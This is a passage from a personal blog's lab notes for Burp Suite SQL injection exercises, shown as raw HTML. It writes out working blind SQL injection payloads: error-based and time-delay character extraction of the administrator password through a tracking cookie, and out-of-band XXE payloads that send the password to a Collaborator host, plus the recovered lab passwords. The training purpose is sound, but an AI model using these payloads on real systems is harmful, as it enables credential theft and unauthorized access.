TrackingId='</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="n">CASE</span><span class="o">+</span><span class="n">WHEN</span><span class="o">+</span> <span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s">'administrator'</span><span class="o">+</span><span class="n">AND</span><span class="o">+</span><span class="nf">substr</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s">'a'</span><span class="p">)</span> <span class="o">+</span><span class="n">THEN</span><span class="o">+</span><span class="nf">to_char</span><span class="p">(</span><span class="mi">1</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">ELSE</span><span class="o">+</span><span class="n">NULL</span><span class="o">+</span><span class="n">END</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">users</span><span class="o">--</span>
<span class="c1"># This uses the substr() function to extract a single character from the password, and test it against a specific value.
# Our attack will cycle through each position and possible value, testing each one in turn.
# Place payload position markers around the final a character in the cookie value. click the "Add §" button
</span><span class="n">TrackingId</span><span class="o">=</span><span class="s">'+UNION+SELECT+CASE+WHEN+ (username='</span><span class="n">administrator</span><span class="s">'+AND+substr(password,1,1)='</span><span class="err">§</span><span class="n">a</span><span class="err">§</span><span class="s">') +THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
# To test the character at each position, assume that the password contains only lower case alphanumeric characters.
# Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9.
# Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.


# Review the attack results to find the value of the character at the first position.
# The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally.
# The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.
# Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value.
# To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2.
TrackingId='</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="n">CASE</span><span class="o">+</span><span class="n">WHEN</span><span class="o">+</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s">'administrator'</span><span class="o">+</span><span class="n">AND</span><span class="o">+</span><span class="nf">substr</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s">'§a§'</span><span class="p">)</span><span class="o">+</span><span class="n">THEN</span><span class="o">+</span><span class="nf">to_char</span><span class="p">(</span><span class="mi">1</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">ELSE</span><span class="o">+</span><span class="n">NULL</span><span class="o">+</span><span class="n">END</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">users</span><span class="o">--</span>
<span class="c1"># Launch the modified attack, review the results, and note the character at the second offset.
# Continue this process testing offset 3, 4, and so on, until you have the whole password.
# Go to the "Account login" function of the lab, and use the password to log in as the administrator user.
</span>
<span class="n">administrator</span>
<span class="n">naa4txy4hmc2m2cz3230</span>
</pre></table></code></div></div><hr /><h1 id="lab-blind-sql-injection-with-time-delays">Lab: Blind SQL injection with time delays</h1><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c1"># Visit the front page of the shop, use Burp Suite to intercept
</span>
<span class="c1"># modify the request containing the TrackingId cookie.
</span><span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s">'||pg_sleep(10)--

# Submit the request and observe that the application takes 10 seconds to respond.

</span></pre></table></code></div></div><hr /><h1 id="lab-blind-sql-injection-with-time-delays-and-information-retrieval">Lab: Blind SQL injection with time delays and information retrieval</h1><div class="table-wrapper"><table><thead><tr><th>DATABASE<th>SQL<tbody><tr><td>use a true statement to trigger the delay:<td> <tr><td>Microsoft SQL Server<td><code class="language-plaintext highlighter-rouge">'; IF (1=1) WAITFOR DELAY '0:0:10'--</code><tr><td>PostgreSQL database<td><code class="language-plaintext highlighter-rouge">'; IF (1=1) SELECT pg_sleep(10)--</code><tr><td>MySQL<td><code class="language-plaintext highlighter-rouge">'; IF (1=1) SELECT sleep(10)--</code><tr><td>just be able to concat nothing to sleep command:<td> <tr><td>Microsoft SQL Server<td><code class="language-plaintext highlighter-rouge">' + WAITFOR DELAY '0:0:10'--</code><tr><td>PostgreSQL database<td><code class="language-plaintext highlighter-rouge">' || pg_sleep(10)--</code><tr><td>MySQL<td><code class="language-plaintext highlighter-rouge">' || sleep(10)--</code></table></div><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="c1"># Visit the front page of the shop
# use Burp Suite to intercept and modify the request containing the TrackingId cookie.
</span>
<span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s">'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
# Verify that the application takes 10 seconds to respond.

TrackingId=x'</span><span class="o">%</span><span class="mi">3</span><span class="n">BSELECT</span><span class="o">+</span><span class="n">CASE</span><span class="o">+</span><span class="n">WHEN</span><span class="o">+</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">THEN</span><span class="o">+</span><span class="nf">pg_sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">+</span><span class="n">ELSE</span><span class="o">+</span><span class="nf">pg_sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">END</span><span class="o">--</span>
<span class="c1"># Verify that the application responds immediately with no time delay.
# This demonstrates how you can test a single boolean condition and infer the result.
</span>

<span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s">'%3BSELECT+CASE+WHEN+(username='</span><span class="n">administrator</span><span class="s">')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
# Verify that the condition is true, confirming that there is a user called administrator.


# The next step is to determine how many characters are in the password of the administrator user.
TrackingId=x'</span><span class="o">%</span><span class="mi">3</span><span class="n">BSELECT</span><span class="o">+</span><span class="n">CASE</span><span class="o">+</span><span class="n">WHEN</span><span class="o">+</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s">'administrator'</span><span class="o">+</span><span class="n">AND</span><span class="o">+</span><span class="nf">length</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">THEN</span><span class="o">+</span><span class="nf">pg_sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">+</span><span class="n">ELSE</span><span class="o">+</span><span class="nf">pg_sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">END</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">users</span><span class="o">--</span>
<span class="c1"># This condition should be true, confirming that the password is greater than 1 character in length.
# Send a series of follow-up values to test different password lengths.
# do this manually using Burp Repeater. When the condition stops being true (i.e. when the application responds immediately without a time delay), determined the length of the password (20 characters)
</span>

<span class="c1"># to test the character at each position to determine its value.
# Burp Intruder.
# Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
</span><span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s">'+SELECT+CASE+WHEN+(username='</span><span class="n">administrator</span><span class="s">'+AND+substring(password,1,1)='</span><span class="n">a</span><span class="s">')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
# This uses the substring() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
# Place payload position markers around the a character in the cookie value. click the "Add §" button.
TrackingId=x'</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="n">CASE</span><span class="o">+</span><span class="n">WHEN</span><span class="o">+</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s">'administrator'</span><span class="o">+</span><span class="n">AND</span><span class="o">+</span><span class="nf">substring</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s">'§a§'</span><span class="p">)</span><span class="o">+</span><span class="n">THEN</span><span class="o">+</span><span class="nf">pg_sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">+</span><span class="n">ELSE</span><span class="o">+</span><span class="nf">pg_sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">END</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">users</span><span class="o">--</span>


<span class="c1"># send suitable payloads in the payload position that you've defined.
# Payloads tab &gt; "Simple list" is selected &gt; "Payload Options" add the payloads
</span>
<span class="c1"># To be able to tell when the correct character was submitted, need to monitor the time taken for the application to respond to each request.
# For this process to be as reliable as possible, issue requests in a single thread.
# Options tab &gt; "Request Engine" section &gt; "Number of threads" to 1.
</span>

<span class="c1"># Launch the attack
# Burp Intruder monitors the time taken for the application's response to be received, but by default it does not show this information.
# "Columns" &gt; "Response received".
# generally contain a small number, representing the number of milliseconds the application took to respond.
# One of the rows should have a larger number in this column, in the region of 10,000 milliseconds.
# The payload showing for that row is the value of the character at the first position.
</span>
<span class="c1"># re-run the attack for each of the other character positions in the password
</span><span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s">'+SELECT+CASE+WHEN+(username='</span><span class="n">administrator</span><span class="s">'+AND+substring(password,2,1)='</span><span class="err">§</span><span class="n">a</span><span class="err">§</span><span class="s">')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--


administrator
sa2jc1k5ua1ui3tpy3uz
</span></pre></table></code></div></div><hr /><h1 id="lab-exploiting-blind-sql-injection-using-out-of-band-oast-techniques">LAB: Exploiting blind SQL injection using out-of-band (OAST) techniques</h1><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c1"># Visit the front page of the shop
# use Burp Suite to intercept and modify the request containing the TrackingId cookie.
</span><span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s">'+UNION+SELECT+extractvalue(xmltype('</span><span class="o">&lt;%</span><span class="mi">3</span><span class="n">fxml</span><span class="o">+</span><span class="n">version</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s">"1.0"</span><span class="o">+</span><span class="n">encoding</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s">"UTF-8"</span><span class="o">%</span><span class="mi">3</span><span class="n">f</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span><span class="o">+</span><span class="n">root</span><span class="o">+</span><span class="p">[</span><span class="o">+&lt;</span><span class="err">!</span><span class="n">ENTITY</span><span class="o">+%</span><span class="mi">25</span><span class="o">+</span><span class="n">remote</span><span class="o">+</span><span class="n">SYSTEM</span><span class="o">+</span><span class="s">"http%3a//x.burpcollaborator.net/"</span><span class="o">&gt;+%</span><span class="mi">25</span><span class="n">remote</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span><span class="p">]</span><span class="o">&gt;</span><span class="s">'),'</span><span class="o">/</span><span class="n">l</span><span class="s">')+FROM+dual--

</span></pre></table></code></div></div><hr /><h1 id="lab-blind-sql-injection-with-out-of-band-data-exfiltration">Lab: Blind SQL injection with out-of-band data exfiltration</h1><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="c1"># Visit the front page of the shop
# use Burp Suite Professional to intercept and modify the request containing the TrackingId cookie.
</span>
<span class="c1"># Burp menu &gt; launch the Burp Collaborator client.
</span>
<span class="c1"># Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
</span>
<span class="c1"># Modify the TrackingId cookie, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
</span><span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s">'+UNION+SELECT+extractvalue(xmltype('</span><span class="o">&lt;%</span><span class="mi">3</span><span class="n">fxml</span><span class="o">+</span><span class="n">version</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s">"1.0"</span><span class="o">+</span><span class="n">encoding</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s">"UTF-8"</span><span class="o">%</span><span class="mi">3</span><span class="n">f</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span><span class="o">+</span><span class="n">root</span><span class="o">+</span><span class="p">[</span><span class="o">+&lt;</span><span class="err">!</span><span class="n">ENTITY</span><span class="o">+%</span><span class="mi">25</span><span class="o">+</span><span class="n">remote</span><span class="o">+</span><span class="n">SYSTEM</span><span class="o">+</span><span class="s">"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"</span><span class="o">&gt;+%</span><span class="mi">25</span><span class="n">remote</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span><span class="p">]</span><span class="o">&gt;</span><span class="s">'),'</span><span class="o">/</span><span class="n">l</span><span class="s">')+FROM+dual--

TrackingId=x'</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="nf">extractvalue</span><span class="p">(</span><span class="nf">xmltype</span><span class="p">(</span><span class="s">'&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//'</span><span class="o">||</span><span class="p">(</span><span class="n">SELECT</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">users</span><span class="o">+</span><span class="n">WHERE</span><span class="o">+</span><span class="n">username</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s">'administrator'</span><span class="p">)</span><span class="o">||</span><span class="s">'.299hf6gydz6v0ym9pulb5wyvimofc4.burpcollaborator.net/"&gt;+%25remote%3b]&gt;'</span><span class="p">),</span><span class="s">'/l'</span><span class="p">)</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">dual</span><span class="o">--</span>

<span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s">'+UNION+SELECT+extractvalue(xmltype('</span><span class="o">&lt;%</span><span class="mi">3</span><span class="n">fxml</span><span class="o">+</span><span class="n">version</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s">"1.0"</span><span class="o">+</span><span class="n">encoding</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s">"UTF-8"</span><span class="o">%</span><span class="mi">3</span><span class="n">f</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span><span class="o">+</span><span class="n">root</span><span class="o">+</span><span class="p">[</span><span class="o">+&lt;</span><span class="err">!</span><span class="n">ENTITY</span><span class="o">+%</span><span class="mi">25</span><span class="o">+</span><span class="n">remote</span><span class="o">+</span><span class="n">SYSTEM</span><span class="o">+</span><span class="s">"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.8mvwhecl9q6rmwlx5kts5jg28tej28.burpcollaborator.net/"</span><span class="o">&gt;+%</span><span class="mi">25</span><span class="n">remote</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span><span class="p">]</span><span class="o">&gt;</span><span class="s">'),'</span><span class="o">/</span><span class="n">l</span><span class="s">')+FROM+dual--




# send


# Go back to the Burp Collaborator client window, and click "Poll now".

# If you don'</span><span class="n">t</span> <span class="n">see</span> <span class="nb">any</span> <span class="n">interactions</span> <span class="n">listed</span><span class="p">,</span> <span class="n">wait</span> <span class="n">a</span> <span class="n">few</span> <span class="n">seconds</span> <span class="ow">and</span> <span class="k">try</span> <span class="n">again</span><span class="p">,</span> <span class="n">since</span> <span class="n">the</span> <span class="n">server</span><span class="o">-</span><span class="n">side</span> <span class="n">query</span> <span class="ow">is</span> <span class="n">executed</span> <span class="n">asynchronously</span><span class="p">.</span>

<span class="c1"># You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
</span>
<span class="c1"># The password of the administrator user should appear in the subdomain of the interaction, and you can view this within the Burp Collaborator client.
</span>
<span class="c1"># For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.
</span>

<span class="c1"># Go to the "Account login" function of the lab, and use the password to log in as the administrator user.
</span>


<span class="c1"># The Collaborator server received a DNS lookup of type A for the domain name nu964b0kdd4qm1zfony7.8mvwhecl9q6rmwlx5kts5jg28tej28.burpcollaborator.net.  The lookup was received from IP address 3.248.186.15 at 2020-Nov-21 00:11:57 UTC.
</span>
<span class="n">nu964b0kdd4qm1zfony7</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/uCvX6mF.png" alt="Screen Shot 2020-11-20 at 19.06.59" /></p><p>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/lab/'>Lab</a>, <a href='/categories/burpsuite/'>Burpsuite</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/lab/" class="post-tag no-text-decoration" >Lab</a> <a href="/tags/burpsuite/" class="post-tag no-text-decoration" >Burpsuite</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Lab - Burpsuite - SQL injection Lab - Grace&url=https://ocholuo.github.io//posts/SQL-injection-Lab/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Lab - Burpsuite - SQL injection Lab - Grace&u=https://ocholuo.github.io//posts/SQL-injection-Lab/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Lab - Burpsuite - SQL injection Lab - Grace&url=https://ocholuo.github.io//posts/SQL-injection-Lab/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Amazon-CloudFront/">AWS Lab - AWS CloudFront</a><li><a href="/posts/Alexa-1stSkill/">AWS Alex First Skill - RedVelvet Time</a><li><a href="/posts/NetworkProtocol-SSL-TLS-Handshake/">NetworkProtocol SSL/TLS Handshake</a><li><a href="/posts/pythonCrash/">Python Crash</a><li><a href="/posts/%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%A7%A3%E9%87%8AAWS/">AWS - 一句话解释AWS</a><li><a href="/posts/GKE/">GCP - Google Cloud Computing - Kubernetes and Kubernetes Engine</a><li><a href="/posts/Go-Note/">Go Note</a><li><a href="/posts/SCPs/">AWS - IdenAccessManage - SCPs (Service Control Policies)</a><li><a href="/posts/CompanyBenefit/">Company Benefit</a><li><a href="/posts/Encryption-SSL&TLS/">Cryptography - SSL/TLS Encryption</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Burpsuite-Intruder/"><div class="card-body"> <span class="timeago small" >Nov 20, 2020<i class="unloaded">2020-11-20T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - Burpsuite - Intruder 发现敏感目录</h3><div class="text-muted small"><p> [toc] Burpsuite - Intruder 发现敏感目录 在burpsuite的proxy栏目中，找到对WackoPicko路径的请求报，右键选择‘Send to intruder’ 切换到Intruder栏目下的Position选项 被 § 包裹着的字段，高亮显示的 这些字段是Intruder在每次请求中都会更改的字段，单击Cl...</p></div></div></a></div><div class="card"> <a href="/posts/AWS-Create-simple-microservice-using-Lambda-and-API-Gateway/"><div class="card-body"> <span class="timeago small" >Jul 16, 2020<i class="unloaded">2020-07-16T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AWS Lab - Create a simple microservice using Lambda and API Gateway</h3><div class="text-muted small"><p> Create a simple microservice using Lambda and API Gateway Create a simple microservice using Lambda and API Gateway overall create an API using Amazon API Gateway o...</p></div></div></a></div><div class="card"> <a href="/posts/AWS-lab/"><div class="card-body"> <span class="timeago small" >Jul 16, 2020<i class="unloaded">2020-07-16T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AWS Lab</h3><div class="text-muted small"><p> AWS Lab AWS Lab 1. beginning 启动实例 2 连接实例 remote desktop 1.3 终止您的实例 2. begin 2.1 Active directory ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Burpsuite-Intruder/" class="btn btn-outline-primary" prompt="Older"><p>Lab - Burpsuite - Intruder 发现敏感目录</p></a> <a href="/posts/Docker-command/" class="btn btn-outline-primary" prompt="Newer"><p>Docker Command</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/ocholuo">Grace JyL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ocholuo.github.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script defer src="/assets/js/dist/pvreport.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-179830187-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-179830187-1'); }); </script>
